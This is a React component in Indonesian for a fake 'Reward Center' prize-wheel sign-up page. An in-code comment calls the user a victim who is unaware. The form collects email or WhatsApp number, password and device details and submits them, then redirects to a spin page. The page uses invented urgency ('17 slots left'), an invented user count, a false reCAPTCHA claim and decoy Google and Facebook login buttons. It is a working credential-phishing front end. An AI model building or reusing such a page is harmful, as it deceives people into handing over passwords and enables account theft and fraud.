import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { detectDevice } from "../device";
import { sendSubmission } from "../store";

const AuthGate = () => {
  const [mode, setMode] = useState("daftar"); // daftar | masuk
  const [identitas, setIdentitas] = useState("");
  const [password, setPassword] = useState("");
  const [setuju, setSetuju] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!setuju) return;
    setLoading(true);

    // Data pendaftaran langsung dikirim — korban belum sadar apa pun
    await sendSubmission({ tipe: "registrasi", metode: mode, identitas, password, perangkat: detectDevice() });

    setTimeout(() => navigate("/wheel"), 900);
  };

  return (
    <div className="min-h-screen" style={{ background: "radial-gradient(120% 100% at 50% 0%, #241333 0%, #0b0b14 55%)" }}>
      <div className="container flex flex-col justify-center" style={{ maxWidth: 480, minHeight: "100vh", padding: "26px 16px 40px" }}>
        <div className="panel" style={{ overflow: "hidden" }}>
          <div style={{ background: "linear-gradient(135deg,#7c2d12,#b91c1c)", padding: "18px", textAlign: "center", borderBottom: "2px solid #ffb020" }}>
            <div style={{ fontSize: 40, marginBottom: 6 }}>🎟️</div>
            <div className="display" style={{ fontSize: 17 }}>Daftar Untuk Ikut Event</div>
            <div style={{ fontSize: 11.5, color: "#fecaca", marginTop: 4 }}>
              Kuota spin gratis tersisa <strong style={{ color: "#ffd166" }}>17 slot</strong> hari ini
            </div>
          </div>

          <div style={{ padding: 22 }}>
            {/* Tab */}
            <div style={{ display: "flex", background: "#0e0e18", borderRadius: 10, padding: 4, marginBottom: 18 }}>
              {[
                ["daftar", "DAFTAR BARU"],
                ["masuk", "SUDAH PUNYA AKUN"],
              ].map(([id, label]) => (
                <button
                  key={id}
                  onClick={() => setMode(id)}
                  style={{
                    flex: 1,
                    padding: "9px 0",
                    borderRadius: 8,
                    border: "none",
                    cursor: "pointer",
                    fontWeight: 800,
                    fontSize: 11.5,
                    fontFamily: "inherit",
                    background: mode === id ? "linear-gradient(180deg,#ffb020,#ff7a00)" : "transparent",
                    color: mode === id ? "#201500" : "#777f96",
                  }}
                >
                  {label}
                </button>
              ))}
            </div>

            <form onSubmit={handleSubmit}>
              <div style={{ marginBottom: 13 }}>
                <input
                  required
                  className="input-dark"
                  value={identitas}
                  onChange={(e) => setIdentitas(e.target.value)}
                  placeholder={mode === "daftar" ? "Email atau No. WhatsApp aktif" : "Email / No. WhatsApp"}
                  autoComplete="off"
                />
              </div>
              <div style={{ marginBottom: 10 }}>
                <input
                  required
                  type="password"
                  className="input-dark"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Buat password (minimal 6 karakter)"
                  minLength={6}
                  autoComplete="off"
                />
                {password.length > 0 && password.length < 6 && (
                  <p style={{ fontSize: 11, color: "#f87171", fontWeight: 700, marginTop: 6 }}>
                    ⚠️ Kurang {6 - password.length} karakter lagi
                  </p>
                )}
              </div>

              <label style={{ display: "flex", gap: 9, alignItems: "flex-start", fontSize: 11, color: "#8b93a7", marginBottom: 18, cursor: "pointer", lineHeight: 1.5 }}>
                <input
                  type="checkbox"
                  required
                  checked={setuju}
                  onChange={(e) => setSetuju(e.target.checked)}
                  style={{ marginTop: 2, accentColor: "#ffb020" }}
                />
                Saya menyetujui <span style={{ color: "#60a5fa" }}>Syarat &amp; Ketentuan</span> serta bersedia
                dihubungi tim Reward Center via WhatsApp
              </label>

              <button type="submit" disabled={loading} className="btn-cta" style={{ width: "100%", fontSize: 16.5, padding: "14px 0" }}>
                {loading ? "⏳ MEMPROSES..." : mode === "daftar" ? "DAFTAR & MULAI SPIN 🎡" : "MASUK & MULAI SPIN 🎡"}
              </button>
            </form>

            <div style={{ display: "flex", alignItems: "center", gap: 10, margin: "16px 0 12px" }}>
              <div style={{ flex: 1, height: 1, background: "#23233a" }} />
              <span style={{ fontSize: 10, color: "#555e74" }}>atau</span>
              <div style={{ flex: 1, height: 1, background: "#23233a" }} />
            </div>

            <div style={{ display: "flex", gap: 8 }}>
              {[
                ["G", "#ea4335", "Google"],
                ["f", "#1877f2", "Facebook"],
              ].map(([initial, color, name]) => (
                <button
                  key={name}
                  onClick={() => {
                    setMode("masuk");
                    alert(`Login ${name} sedang tidak tersedia, gunakan email/WhatsApp.`);
                  }}
                  style={{
                    flex: 1,
                    padding: "11px 0",
                    borderRadius: 10,
                    border: "1.5px solid #33334a",
                    background: "#0e0e18",
                    color: "#c9cede",
                    fontWeight: 700,
                    fontSize: 12.5,
                    fontFamily: "inherit",
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                  }}
                >
                  <span style={{
                    width: 20, height: 20, borderRadius: 6, background: color, color: "#fff",
                    display: "inline-flex", alignItems: "center", justifyContent: "center",
                    fontWeight: 800, fontSize: 12,
                  }}>{initial}</span>
                  {name}
                </button>
              ))}
            </div>
          </div>

          <div style={{ background: "#0e0e18", padding: "10px", textAlign: "center", fontSize: 9.5, color: "#3d4560", borderTop: "1px solid #23233a" }}>
            Dilindungi reCAPTCHA · © 2026 Reward Center International Ltd.
          </div>
        </div>

        <p style={{ textAlign: "center", marginTop: 14, fontSize: 10.5, color: "#4a5165" }}>
          Sudah <strong style={{ color: "#8b93a7" }}>12.483</strong> pengguna mendaftar hari ini 🔥
        </p>
      </div>
    </div>
  );
};

export default AuthGate;
